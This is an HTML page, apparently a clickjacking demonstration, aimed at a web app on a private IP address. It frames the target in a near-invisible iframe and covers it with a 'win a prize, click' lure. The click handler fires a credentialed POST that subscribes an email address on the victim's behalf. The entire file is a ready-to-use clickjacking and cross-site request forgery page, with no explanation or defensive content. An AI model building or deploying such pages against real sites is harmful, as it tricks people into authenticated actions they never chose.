


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>クリックジャッキングデモ</title>
    <style>
        body {
            position: relative;
            width: 100%;
            height: 100vh;
            margin: 0;
        }
        iframe {
            width: 100%;
            height: 100%;
            opacity: 0.1;
            pointer-events: none; 
        }
        .overlay {
            position: absolute;
            top: 20%; 
            left: 20%; 
            width: 60%; 
            height: 60%; 
            background-color: rgba(255, 255, 255, 0.9);
            pointer-events: auto;
        }
    </style>
</head>
<body>
    <iframe src="http://172.24.186.52:3000/"></iframe>
    <div class="overlay" onclick="submitForm()">
        <h2>賞を獲得する</h2>
        <p>クリック</p>
    </div>

    <script>
        function submitForm() {
            
            fetch('http://172.24.186.52/api/subscriptions?email=any@any.com', {
                method: 'POST',
                credentials: 'include'
            });
            alert('Subscribed!');
        }
    </script>
</body>
</html>
